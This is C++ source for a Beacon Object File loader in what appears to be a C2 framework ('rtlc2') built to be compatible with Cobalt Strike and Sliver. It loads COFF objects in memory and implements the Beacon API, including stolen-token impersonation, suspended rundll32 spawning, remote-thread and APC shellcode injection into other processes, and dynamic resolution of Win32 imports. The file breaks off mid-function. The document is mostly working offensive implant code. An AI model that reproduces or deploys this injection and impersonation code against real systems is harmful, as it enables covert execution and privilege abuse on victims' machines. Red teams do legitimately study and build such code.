// BOF (Beacon Object File) Loader
// Loads and executes COFF object files in memory
// Compatible with Cobalt Strike and Sliver BOF format

#include "bof.h"
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#else
#include <unistd.h>
#endif

namespace rtlc2 {
namespace bof {

// ============================================================================
// COFF file structures
// ============================================================================
#pragma pack(push, 1)
struct COFFHeader {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
};

struct COFFSection {
    char Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
};

struct COFFSymbol {
    union {
        char ShortName[8];
        struct {
            uint32_t Zeros;
            uint32_t Offset;
        } N;
    };
    uint32_t Value;
    int16_t SectionNumber;
    uint16_t Type;
    uint8_t StorageClass;
    uint8_t NumberOfAuxSymbols;
};

struct COFFRelocation {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
};
#pragma pack(pop)

// ============================================================================
// COFF machine types
// ============================================================================
#define COFF_MACHINE_AMD64 0x8664
#define COFF_MACHINE_I386  0x014c

// ============================================================================
// COFF relocation types (AMD64)
// ============================================================================
#define IMAGE_REL_AMD64_ABSOLUTE 0x0000
#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32   0x0002
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009
#define IMAGE_REL_AMD64_SECTION  0x000A
#define IMAGE_REL_AMD64_SECREL   0x000B

// ============================================================================
// COFF relocation types (i386)
// ============================================================================
#define IMAGE_REL_I386_ABSOLUTE  0x0000
#define IMAGE_REL_I386_DIR32     0x0006
#define IMAGE_REL_I386_DIR32NB   0x0007
#define IMAGE_REL_I386_REL32     0x0014

// ============================================================================
// COFF section characteristics
// ============================================================================
#define IMAGE_SCN_CNT_CODE              0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA  0x00000040
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080
#define IMAGE_SCN_MEM_EXECUTE           0x20000000
#define IMAGE_SCN_MEM_READ              0x40000000
#define IMAGE_SCN_MEM_WRITE             0x80000000

// ============================================================================
// COFF symbol storage classes
// ============================================================================
#define IMAGE_SYM_CLASS_EXTERNAL   2
#define IMAGE_SYM_CLASS_STATIC     3
#define IMAGE_SYM_CLASS_LABEL      6
#define IMAGE_SYM_CLASS_SECTION    104

// ============================================================================
// BOF output capture buffer (global, used by Beacon API)
// ============================================================================
static char* g_bof_output = nullptr;
static size_t g_bof_output_len = 0;
static size_t g_bof_output_cap = 0;

static void ResetOutputBuffer() {
    if (g_bof_output) {
        free(g_bof_output);
        g_bof_output = nullptr;
    }
    g_bof_output_len = 0;
    g_bof_output_cap = 0;
}

static void AppendToOutputBuffer(const char* data, size_t len) {
    if (!data || len == 0) return;

    if (!g_bof_output) {
        g_bof_output_cap = (len < 4096) ? 4096 : (len * 2);
        g_bof_output = (char*)malloc(g_bof_output_cap);
        if (!g_bof_output) return;
        g_bof_output_len = 0;
    }

    size_t needed = g_bof_output_len + len;
    if (needed > g_bof_output_cap) {
        g_bof_output_cap = needed * 2;
        char* newbuf = (char*)realloc(g_bof_output, g_bof_output_cap);
        if (!newbuf) return;
        g_bof_output = newbuf;
    }

    memcpy(g_bof_output + g_bof_output_len, data, len);
    g_bof_output_len += len;
}

// ============================================================================
// Beacon Data Parser - internal struct matching Cobalt Strike layout
// ============================================================================
struct DataParser {
    char* buffer;
    int length;
    int position;
};

// ============================================================================
// Format buffer for BeaconFormat* API
// ============================================================================
struct FormatBuffer {
    char* buffer;
    int length;
    int capacity;
};

} // namespace bof
} // namespace rtlc2

// ============================================================================
// Beacon API functions (extern "C" - called by BOFs)
// ============================================================================
extern "C" {

using namespace rtlc2::bof;

void BeaconOutput(int type, const char* data, int len) {
    (void)type;
    AppendToOutputBuffer(data, (size_t)len);
}

void BeaconPrintf(int type, const char* fmt, ...) {
    char buf[8192];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len > 0) {
        BeaconOutput(type, buf, len);
    }
}

void BeaconDataParse(void* parser, char* buffer, int size) {
    DataParser* p = (DataParser*)parser;
    p->buffer = buffer;
    p->length = size;
    p->position = 0;
}

int BeaconDataInt(void* parser) {
    DataParser* p = (DataParser*)parser;
    if (p->position + 4 > p->length) return 0;
    int value;
    memcpy(&value, p->buffer + p->position, 4);
    p->position += 4;
    return value;
}

short BeaconDataShort(void* parser) {
    DataParser* p = (DataParser*)parser;
    if (p->position + 2 > p->length) return 0;
    short value;
    memcpy(&value, p->buffer + p->position, 2);
    p->position += 2;
    return value;
}

char* BeaconDataExtract(void* parser, int* out_len) {
    DataParser* p = (DataParser*)parser;

    if (p->position + 4 > p->length) {
        if (out_len) *out_len = 0;
        return nullptr;
    }

    int len;
    memcpy(&len, p->buffer + p->position, 4);
    p->position += 4;

    if (p->position + len > p->length) {
        if (out_len) *out_len = 0;
        return nullptr;
    }

    char* data = p->buffer + p->position;
    p->position += len;
    if (out_len) *out_len = len;
    return data;
}

int BeaconDataLength(void* parser) {
    DataParser* p = (DataParser*)parser;
    return p->length - p->position;
}

// Global stolen token handle for BeaconUseToken/BeaconRevertToken
#ifdef RTLC2_WINDOWS
static HANDLE g_stolenToken = NULL;
#endif

// Token functions
int BeaconUseToken(void* token) {
#ifdef RTLC2_WINDOWS
    HANDLE hToken = (HANDLE)token;
    if (!hToken) return 0;
    if (ImpersonateLoggedOnUser(hToken)) {
        // Store a duplicate of the token for later revert
        if (g_stolenToken) {
            CloseHandle(g_stolenToken);
            g_stolenToken = NULL;
        }
        DuplicateHandle(GetCurrentProcess(), hToken, GetCurrentProcess(),
                        &g_stolenToken, 0, FALSE, DUPLICATE_SAME_ACCESS);
        return 1; // TRUE - success
    }
    return 0; // FALSE - failed
#else
    (void)token;
    return 0;
#endif
}

void BeaconRevertToken(void) {
#ifdef RTLC2_WINDOWS
    RevertToSelf();
    if (g_stolenToken) {
        CloseHandle(g_stolenToken);
        g_stolenToken = NULL;
    }
#endif
}

// Check if running as admin
int BeaconIsAdmin(void) {
#ifdef RTLC2_WINDOWS
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin ? 1 : 0;
#else
    return (getuid() == 0) ? 1 : 0;
#endif
}

void BeaconGetSpawnTo(int x86, char* buffer, int length) {
    (void)x86;
    if (buffer && length > 0) {
#ifdef RTLC2_WINDOWS
        const char* defaultSpawn = "C:\\Windows\\System32\\rundll32.exe";
        strncpy(buffer, defaultSpawn, (size_t)(length - 1));
        buffer[length - 1] = '\0';
#else
        buffer[0] = '\0';
#endif
    }
}

void BeaconCleanupProcess(void* process_info) {
#ifdef RTLC2_WINDOWS
    if (process_info) {
        PROCESS_INFORMATION* pi = (PROCESS_INFORMATION*)process_info;
        if (pi->hProcess) CloseHandle(pi->hProcess);
        if (pi->hThread) CloseHandle(pi->hThread);
    }
#else
    (void)process_info;
#endif
}

// Format API
void BeaconFormatAlloc(void* format, int maxsz) {
    FormatBuffer* f = (FormatBuffer*)format;
    f->buffer = (char*)calloc(1, (size_t)maxsz);
    f->length = 0;
    f->capacity = maxsz;
}

void BeaconFormatReset(void* format) {
    FormatBuffer* f = (FormatBuffer*)format;
    if (f->buffer) {
        memset(f->buffer, 0, (size_t)f->capacity);
    }
    f->length = 0;
}

void BeaconFormatFree(void* format) {
    FormatBuffer* f = (FormatBuffer*)format;
    if (f->buffer) {
        free(f->buffer);
        f->buffer = nullptr;
    }
    f->length = 0;
    f->capacity = 0;
}

void BeaconFormatAppend(void* format, const char* data, int len) {
    FormatBuffer* f = (FormatBuffer*)format;
    if (!f->buffer || !data) return;
    if (f->length + len > f->capacity) return;
    memcpy(f->buffer + f->length, data, (size_t)len);
    f->length += len;
}

void BeaconFormatPrintf(void* format, const char* fmt, ...) {
    FormatBuffer* f = (FormatBuffer*)format;
    if (!f->buffer) return;
    int remaining = f->capacity - f->length;
    if (remaining <= 0) return;

    va_list args;
    va_start(args, fmt);
    int written = vsnprintf(f->buffer + f->length, (size_t)remaining, fmt, args);
    va_end(args);
    if (written > 0 && written < remaining) {
        f->length += written;
    }
}

char* BeaconFormatToString(void* format, int* size) {
    FormatBuffer* f = (FormatBuffer*)format;
    if (size) *size = f->length;
    return f->buffer;
}

void BeaconFormatInt(void* format, int value) {
    // Big-endian int for format buffers (Cobalt Strike convention)
    char buf[4];
    buf[0] = (char)((value >> 24) & 0xFF);
    buf[1] = (char)((value >> 16) & 0xFF);
    buf[2] = (char)((value >> 8) & 0xFF);
    buf[3] = (char)(value & 0xFF);
    BeaconFormatAppend(format, buf, 4);
}

// Inline-execute functions
int BeaconSpawnTemporaryProcess(int x86, int ignoreToken, void* startupInfo, void* processInfo) {
#ifdef RTLC2_WINDOWS
    (void)x86; // TODO: use x86 spawn-to path vs x64

    // Get spawn-to path from config
    char spawnTo[MAX_PATH];
    BeaconGetSpawnTo(x86, spawnTo, MAX_PATH);

    STARTUPINFOA* pSi = (STARTUPINFOA*)startupInfo;
    PROCESS_INFORMATION* pPi = (PROCESS_INFORMATION*)processInfo;

    if (!pSi || !pPi) return 0;

    // Initialize STARTUPINFOA if not already
    if (pSi->cb == 0) {
        memset(pSi, 0, sizeof(STARTUPINFOA));
        pSi->cb = sizeof(STARTUPINFOA);
    }
    memset(pPi, 0, sizeof(PROCESS_INFORMATION));

    // Create the process in a suspended state
    DWORD creationFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW;

    HANDLE hToken = NULL;
    BOOL created = FALSE;

    if (!ignoreToken && g_stolenToken) {
        // Use the stolen token to create the process
        created = CreateProcessAsUserA(g_stolenToken, NULL, spawnTo, NULL, NULL,
                                       TRUE, creationFlags, NULL, NULL, pSi, pPi);
    }

    if (!created) {
        // Fall back to regular CreateProcessA
        created = CreateProcessA(NULL, spawnTo, NULL, NULL, TRUE,
                                 creationFlags, NULL, NULL, pSi, pPi);
    }

    return created ? 1 : 0;
#else
    (void)x86; (void)ignoreToken; (void)startupInfo; (void)processInfo;
    return 0;
#endif
}

void BeaconInjectProcess(void* processInfo, int pid, char* payload, int payloadLen, int offset, char* arg, int argLen) {
#ifdef RTLC2_WINDOWS
    (void)processInfo; // processInfo not used for arbitrary PID injection
    (void)arg; (void)argLen; // arguments reserved for future use

    if (!payload || payloadLen <= 0) return;

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProcess) return;

    // Allocate memory in the target process
    void* remoteMem = VirtualAllocEx(hProcess, NULL, (SIZE_T)payloadLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return;
    }

    // Write the payload
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, payload + offset,
                            (SIZE_T)(payloadLen - offset), &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Change memory protection to executable
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, (SIZE_T)payloadLen, PAGE_EXECUTE_READ, &oldProtect);

    // Create remote thread to execute the payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remoteMem,
                                        NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
#else
    (void)processInfo; (void)pid; (void)payload; (void)payloadLen;
    (void)offset; (void)arg; (void)argLen;
#endif
}

void BeaconInjectTemporaryProcess(void* processInfo, char* payload, int payloadLen, int offset, char* arg, int argLen) {
#ifdef RTLC2_WINDOWS
    (void)arg; (void)argLen; // arguments reserved for future use

    if (!processInfo || !payload || payloadLen <= 0) return;

    PROCESS_INFORMATION* pPi = (PROCESS_INFORMATION*)processInfo;
    if (!pPi->hProcess) return;

    // Allocate memory in the temporary process
    void* remoteMem = VirtualAllocEx(pPi->hProcess, NULL, (SIZE_T)payloadLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) return;

    // Write the payload
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pPi->hProcess, remoteMem, payload + offset,
                            (SIZE_T)(payloadLen - offset), &bytesWritten)) {
        VirtualFreeEx(pPi->hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }

    // Change memory protection to executable
    DWORD oldProtect;
    VirtualProtectEx(pPi->hProcess, remoteMem, (SIZE_T)payloadLen,
                     PAGE_EXECUTE_READ, &oldProtect);

    // Queue APC to the suspended main thread of the temporary process
    QueueUserAPC((PAPCFUNC)remoteMem, pPi->hThread, 0);

    // Resume the main thread so the APC executes
    ResumeThread(pPi->hThread);
#else
    (void)processInfo; (void)payload; (void)payloadLen;
    (void)offset; (void)arg; (void)argLen;
#endif
}

int toWideChar(const char* src, wchar_t* dst, int max) {
#ifdef RTLC2_WINDOWS
    return MultiByteToWideChar(CP_ACP, 0, src, -1, dst, max);
#else
    (void)src; (void)dst; (void)max;
    return 0;
#endif
}

} // extern "C"


namespace rtlc2 {
namespace bof {

#ifdef RTLC2_WINDOWS

// ============================================================================
// Beacon API function pointer map
// Maps import names to their function addresses
// ============================================================================
struct BeaconAPIEntry {
    const char* name;
    void* func;
};

static const BeaconAPIEntry g_beacon_api[] = {
    { "BeaconOutput",                 (void*)BeaconOutput },
    { "BeaconPrintf",                 (void*)BeaconPrintf },
    { "BeaconDataParse",              (void*)BeaconDataParse },
    { "BeaconDataInt",                (void*)BeaconDataInt },
    { "BeaconDataShort",              (void*)BeaconDataShort },
    { "BeaconDataExtract",            (void*)BeaconDataExtract },
    { "BeaconDataLength",             (void*)BeaconDataLength },
    { "BeaconUseToken",               (void*)BeaconUseToken },
    { "BeaconRevertToken",            (void*)BeaconRevertToken },
    { "BeaconIsAdmin",                (void*)BeaconIsAdmin },
    { "BeaconGetSpawnTo",             (void*)BeaconGetSpawnTo },
    { "BeaconCleanupProcess",         (void*)BeaconCleanupProcess },
    { "BeaconFormatAlloc",            (void*)BeaconFormatAlloc },
    { "BeaconFormatReset",            (void*)BeaconFormatReset },
    { "BeaconFormatFree",             (void*)BeaconFormatFree },
    { "BeaconFormatAppend",           (void*)BeaconFormatAppend },
    { "BeaconFormatPrintf",           (void*)BeaconFormatPrintf },
    { "BeaconFormatToString",         (void*)BeaconFormatToString },
    { "BeaconFormatInt",              (void*)BeaconFormatInt },
    { "BeaconSpawnTemporaryProcess",  (void*)BeaconSpawnTemporaryProcess },
    { "BeaconInjectProcess",          (void*)BeaconInjectProcess },
    { "BeaconInjectTemporaryProcess", (void*)BeaconInjectTemporaryProcess },
    { "toWideChar",                   (void*)toWideChar },
    { nullptr, nullptr }
};

// ============================================================================
// Helper: get symbol name from COFF symbol table
// Handles both short names (<=8 chars inline) and long names (string table)
// ============================================================================
static std::string GetSymbolName(const COFFSymbol* sym, const char* stringTable) {
    if (sym->N.Zeros != 0) {
        // Short name: inline in the 8-byte field, may not be null-terminated
        char name[9];
        memcpy(name, sym->ShortName, 8);
        name[8] = '\0';
        return std::string(name);
    } else {
        // Long name: offset into string table
        if (stringTable) {
            return std::string(stringTable + sym->N.Offset);
        }
        return "";
    }
}

// ============================================================================
// Helper: resolve a Beacon API import by name
// Returns function pointer if the name matches a known Beacon API function
// ============================================================================
static void* ResolveBeaconAPI(const std::string& funcName) {
    for (int i = 0; g_beacon_api[i].name != nullptr; i++) {
        if (funcName == g_beacon_api[i].name) {
            return g_beacon_api[i].func;
        }
    }
    return nullptr;
}

// ============================================================================
// Helper: resolve a Win32 API import from __imp_LIBRARY$Function format
// The '$' separates the library name from the function name.
// ============================================================================
static void* ResolveWin32Import(const std::string& importName) {
    // Format: LIBRARY$Function
    // e.g., KERNEL32$GetLastError, NTDLL$NtCreateFile
    auto dollarPos = importName.find('$');
    if (dollarPos == std::string::npos) {
        return nullptr;
    }

    std::string libName = importName.substr(0, dollarPos);
    std::string funcName = importName.substr(dollarPos + 1);

    if (libName.empty() || funcName.empty()) {
        return nullptr;
    }

    // GetModuleHandleA first (library might already be loaded)
    HMODULE hMod = GetModuleHandleA(libName.c_str());
    if (!hMod) {
        // Try with .dll extension
        std::string libWithDll = libName + ".dll";
        hMod = GetModuleHandleA(libWithDll.c_str());
    }
    if (!hMod) {
        // Try loading it
        hMod = LoadLibraryA(libName.c_str());
    }
    if (!hMod) {
        std::string libWithDll = libName + ".dll";
        hMod = LoadLibraryA(libWithDll.c_str());
    }
    if (!hMod) {
        return nullptr;
    }

    FARPROC proc = GetProcAddress(hMod, funcName.c_str());
    return (void*)proc;
}

// ============================================================================
// Helper: align value up to alignment boundary
// ============================================================================
static inline size_t AlignUp(size_t value, size_t alignment) {
    return (value + alignment - 1) & ~(alignment - 1);
}

#endif // RTLC2_WINDOWS

// ============================================================================
// Execute a BOF (Beacon Object File)
// ============================================================================
BOFResult Execute(const std::vector<uint8_t>& bof_data,
                  const std::string& function_name,
                  const std::vector<uint8_t>& args) {

    BOFResult result;
    result.success = false;
    result.exit_code = -1;

#ifdef RTLC2_WINDOWS

    // -----------------------------------------------------------------------
    // Step 0: Validate input size
    // -----------------------------------------------------------------------
    if (bof_data.size() < sizeof(COFFHeader)) {
        result.output = "Invalid BOF: too small for COFF header";
        return result;
    }

    const uint8_t* raw = bof_data.data();
    size_t rawSize = bof_data.size();

    const COFFHeader* header = reinterpret_cast<const COFFHeader*>(raw);

    // Validate COFF machine type
    if (header->Machine != COFF_MACHINE_AMD64 && header->Machine != COFF_MACHINE_I386) {
        result.output = "Invalid BOF: unsupported machine type 0x" +
                        std::to_string(header->Machine);
        return result;
    }

    bool is64 = (header->Machine == COFF_MACHINE_AMD64);

    // Validate section count
    if (header->NumberOfSections == 0) {
        result.output = "Invalid BOF: no sections";
        return result;
    }

    // -----------------------------------------------------------------------
    // Step 1: Parse section headers
    // -----------------------------------------------------------------------
    size_t sectionTableOffset = sizeof(COFFHeader) + header->SizeOfOptionalHeader;
    if (sectionTableOffset + (header->NumberOfSections * sizeof(COFFSection)) > rawSize) {
        result.output = "Invalid BOF: section table exceeds file size";
        return result;
    }

    const COFFSection* sections = reinterpret_cast<const COFFSection*>(raw + sectionTableOffset);

    // -----------------------------------------------------------------------
    // Step 2: Parse symbol table and string table
    // -----------------------------------------------------------------------
    if (header->PointerToSymbolTable == 0 || header->NumberOfSymbols == 0) {
        result.output = "Invalid BOF: no symbol table";
        return result;
    }

    size_t symTableOffset = header->PointerToSymbolTable;
    size_t symTableSize = header->NumberOfSymbols * sizeof(COFFSymbol);
    if (symTableOffset + symTableSize > rawSize) {
        result.output = "Invalid BOF: symbol table exceeds file size";
        return result;
    }

    const COFFSymbol* symbols = reinterpret_cast<const COFFSymbol*>(raw + symTableOffset);

    // String table follows immediately after symbol table
    const char* stringTable = nullptr;
    size_t stringTableOffset = symTableOffset + symTableSize;
    if (stringTableOffset + 4 <= rawSize) {
        // First 4 bytes of string table is its total size
        stringTable = reinterpret_cast<const char*>(raw + stringTableOffset);
    }

    // -----------------------------------------------------------------------
    // Step 3: Calculate total memory needed (page-align each section)
    // -----------------------------------------------------------------------
    const size_t PAGE_SIZE = 4096;
    size_t totalSize = 0;

    for (int i = 0; i < header->NumberOfSections; i++) {
        size_t secSize = sections[i].SizeOfRawData;
        if (secSize == 0 && (sections[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)) {
            // BSS section: use VirtualSize
            secSize = sections[i].VirtualSize;
        }
        if (secSize == 0) secSize = PAGE_SIZE; // minimum allocation
        totalSize += AlignUp(secSize, PAGE_SIZE);
    }

    if (totalSize == 0) {
        result.output = "Invalid BOF: no section data";
        return result;
    }

    // -----------------------------------------------------------------------
    // Step 4: Allocate memory for all sections
    // -----------------------------------------------------------------------
    uint8_t* imageBase = (uint8_t*)VirtualAlloc(
        NULL, totalSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!imageBase) {
        result.output = "BOF: VirtualAlloc failed (error " +
                        std::to_string(GetLastError()) + ")";
        return result;
    }

    // Zero the entire allocation
    memset(imageBase, 0, totalSize);

    // -----------------------------------------------------------------------
    // Step 5: Copy section data into allocated memory and track base addresses
    // -----------------------------------------------------------------------
    std::vector<uint8_t*> sectionBases(header->NumberOfSections, nullptr);
    size_t currentOffset = 0;

    for (int i = 0; i < header->NumberOfSections; i++) {
        sectionBases[i] = imageBase + currentOffset;

        size_t secSize = sections[i].SizeOfRawData;
        bool isBSS = (sections[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) != 0;

        if (isBSS) {
            // BSS: zero-initialized, no data to copy
            size_t bssSize = sections[i].VirtualSize;
            if (bssSize == 0) bssSize = sections[i].SizeOfRawData;
            // Already zeroed by memset above
            size_t allocSize = (bssSize > 0) ? bssSize : PAGE_SIZE;
            currentOffset += AlignUp(allocSize, PAGE_SIZE);
        } else {
            if (secSize > 0 && sections[i].PointerToRawData > 0) {
                // Validate that section data is within the file
                if ((size_t)sections[i].PointerToRawData + secSize > rawSize) {
                    VirtualFree(imageBase, 0, MEM_RELEASE);
                    result.output = "Invalid BOF: section " + std::to_string(i) +
                                    " data exceeds file size";
                    return result;
                }
                memcpy(sectionBases[i], raw + sections[i].PointerToRawData, secSize);
            }
            size_t allocSize = (secSize > 0) ? secSize : PAGE_SIZE;
            currentOffset += AlignUp(allocSize, PAGE_SIZE);
        }
    }

    // -----------------------------------------------------------------------
    // Step 6: Build symbol resolution table
    // Resolve all symbols to their addresses
    // -----------------------------------------------------------------------

    // Storage for resolved function pointers (__imp_ symbols need stable addresses
    // because the code does indirect calls through them)
    static std::vector<void*> s_resolvedImports;
    s_resolvedImports.clear();
    s_resolvedImports.reserve(header->NumberOfSymbols);

    // Map each symbol index to its resolved address
    std::vector<uint64_t> symbolAddresses(header->NumberOfSymbols, 0);

    for (uint32_t i = 0; i < header->NumberOfSymbols; i++) {
        const COFFSymbol* sym = &symbols[i];
        std::string symName = GetSymbolName(sym, stringTable);

        if (sym->SectionNumber > 0) {
            // Symbol is defined in a section
            int secIdx = sym->SectionNumber - 1; // 1-based to 0-based
            if (secIdx < header->NumberOfSections) {
                symbolAddresses[i] = (uint64_t)(sectionBases[secIdx] + sym->Value);
            }
        } else if (sym->SectionNumber == 0 && sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
            // External symbol - needs to be resolved
            // Check for __imp_ prefix (indirect import)
            std::string lookupName = symName;
            bool isImpPrefix = false;

            if (lookupName.rfind("__imp_", 0) == 0) {
                lookupName = lookupName.substr(6); // Remove __imp_
                isImpPrefix = true;
            }
            // MinGW sometimes uses single underscore prefix
            if (lookupName.size() > 0 && lookupName[0] == '_' && !is64) {
                // For 32-bit, strip leading underscore (cdecl decoration)
                lookupName = lookupName.substr(1);
            }

            void* resolved = nullptr;

            // Try Beacon API first
            resolved = ResolveBeaconAPI(lookupName);

            // Try Win32 import (LIBRARY$Function format)
            if (!resolved) {
                resolved = ResolveWin32Import(lookupName);
            }

            if (resolved) {
                if (isImpPrefix) {
                    // __imp_ symbols: the code expects a pointer to a pointer.
                    // Store the function pointer in our static vector, then
                    // set the symbol address to the address of that storage.
                    s_resolvedImports.push_back(resolved);
                    symbolAddresses[i] = (uint64_t)&s_resolvedImports.back();
                } else {
                    symbolAddresses[i] = (uint64_t)resolved;
                }
            } else {
                // Unresolved external - could be a forward declaration or
                // a symbol the BOF doesn't actually call. Set to 0 and continue.
                symbolAddresses[i] = 0;
            }
        } else if (sym->SectionNumber == -2) {
            // Debug symbol
            symbolAddresses[i] = 0;
        } else if (sym->SectionNumber == -1) {
            // Absolute symbol
            symbolAddresses[i] = (uint64_t)sym->Value;
        }

        // Skip auxiliary symbol records
        i += sym->NumberOfAuxSymbols;
    }

    // -----------------------------------------------------------------------
    // Step 7: Process relocations for each section
    // -----------------------------------------------------------------------
    for (int secIdx = 0; secIdx < header->NumberOfSections; secIdx++) {
        const COFFSection* sec = &sections[secIdx];
        if (sec->NumberOfRelocations == 0 || sec->PointerToRelocations == 0) {
            continue;
        }

        // Validate relocation table location
        size_t relocOffset = sec->PointerToRelocations;
        size_t relocSize = sec->NumberOfRelocations * sizeof(COFFRelocation);
        if (relocOffset + relocSize > rawSize) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            result.output = "Invalid BOF: relocation table exceeds file size for section " +
                            std::to_string(secIdx);
            return result;
        }

        const COFFRelocation* relocs = reinterpret_cast<const COFFRelocation*>(raw + relocOffset);

        for (int r = 0; r < sec->NumberOfRelocations; r++) {
            const COFFRelocation* reloc = &relocs[r];

            // Validate symbol index
            if (reloc->SymbolTableIndex >= header->NumberOfSymbols) {
                continue;
            }

            uint8_t* patchAddr = sectionBases[secIdx] + reloc->VirtualAddress;
            uint64_t symAddr = symbolAddresses[reloc->SymbolTableIndex];

            if (is64) {
                // AMD64 relocations
                switch (reloc->Type) {
                    case IMAGE_REL_AMD64_ADDR64:
                        *(uint64_t*)patchAddr += symAddr;
                        break;

                    case IMAGE_REL_AMD64_ADDR32:
                        *(uint32_t*)patchAddr += (uint32_t)symAddr;
                        break;

                    case IMAGE_REL_AMD64_ADDR32NB:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)imageBase);
                        break;

                    case IMAGE_REL_AMD64_REL32:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 4);
                        break;

                    case IMAGE_REL_AMD64_REL32_1:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 5);
                        break;

                    case IMAGE_REL_AMD64_REL32_2:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 6);
                        break;

                    case IMAGE_REL_AMD64_REL32_3:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 7);
                        break;

                    case IMAGE_REL_AMD64_REL32_4:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 8);
                        break;

                    case IMAGE_REL_AMD64_REL32_5:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 9);
                        break;

                    case IMAGE_REL_AMD64_SECTION:
                        // Section index of the symbol
                        *(uint16_t*)patchAddr = (uint16_t)symbols[reloc->SymbolTableIndex].SectionNumber;
                        break;

                    case IMAGE_REL_AMD64_SECREL:
                        // Offset from beginning of section
                        *(uint32_t*)patchAddr += (uint32_t)symbols[reloc->SymbolTableIndex].Value;
                        break;

                    case IMAGE_REL_AMD64_ABSOLUTE:
                        // No-op (used for alignment padding)
                        break;

                    default:
                        // Unknown relocation type - skip
                        break;
                }
            } else {
                // i386 relocations
                switch (reloc->Type) {
                    case IMAGE_REL_I386_DIR32:
                        *(uint32_t*)patchAddr += (uint32_t)symAddr;
                        break;

                    case IMAGE_REL_I386_DIR32NB:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)imageBase);
                        break;

                    case IMAGE_REL_I386_REL32:
                        *(int32_t*)patchAddr += (int32_t)(symAddr - (uint64_t)patchAddr - 4);
                        break;

                    case IMAGE_REL_I386_ABSOLUTE:
                        break;

                    default:
                        break;
                }
            }
        }
    }

    // -----------------------------------------------------------------------
    // Step 8: Set memory protections per section characteristics
    // -----------------------------------------------------------------------
    currentOffset = 0;
    for (int i = 0; i < header->NumberOfSections; i++) {
        size_t secSize = sections[i].SizeOfRawData;
        bool isBSS = (sections[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) != 0;
        if (isBSS) {
            secSize = sections[i].VirtualSize;
            if (secSize == 0) secSize = sections[i].SizeOfRawData;
        }
        if (secSize == 0) secSize = PAGE_SIZE;
        size_t alignedSize = AlignUp(secSize, PAGE_SIZE);

        DWORD protect = PAGE_READONLY;
        uint32_t chars = sections[i].Characteristics;

        bool exec  = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool write = (chars & IMAGE_SCN_MEM_WRITE) != 0;
        bool read  = (chars & IMAGE_SCN_MEM_READ) != 0;

        if (exec && write) {
            protect = PAGE_EXECUTE_READWRITE;
        } else if (exec) {
            protect = PAGE_EXECUTE_READ;
        } else if (write) {
            protect = PAGE_READWRITE;
        } else if (read) {
            protect = PAGE_READONLY;
        } else {
            // Default: if section contains code, make it executable
            if (chars & IMAGE_SCN_CNT_CODE) {
                protect = PAGE_EXECUTE_READ;
            } else {
                protect = PAGE_READWRITE; // Safe default for data sections
            }
        }

        DWORD oldProtect;
        VirtualProtect(imageBase + currentOffset, alignedSize, protect, &oldProtect);

